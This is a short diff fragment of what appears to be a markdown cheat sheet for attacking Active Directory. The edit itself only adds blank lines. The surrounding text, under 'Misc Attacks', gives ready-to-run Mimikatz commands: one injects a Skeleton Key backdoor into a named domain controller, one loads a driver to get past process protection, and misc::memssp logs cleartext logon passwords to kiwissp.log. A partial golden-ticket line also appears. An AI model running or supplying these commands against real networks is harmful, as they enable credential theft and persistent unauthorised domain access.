@@ -242,6 +242,7 @@ id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 
 #### Misc Attacks
 Skeleton Key Attack:-
+
 ```Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc01.ecorp.local```
 
 May require Kernel Driverload onto the host if process protected:-
@@ -255,6 +256,7 @@ misc::skeleton
 ```
  
  MemSSP logs local logons, service account and machine account passwords in clear text on the target server:-
+ 
 ```Invoke-Mimikatz -Command '"misc::memssp"'``` - Logs local logons to C:\Windows\system32\kiwissp.log
 
 
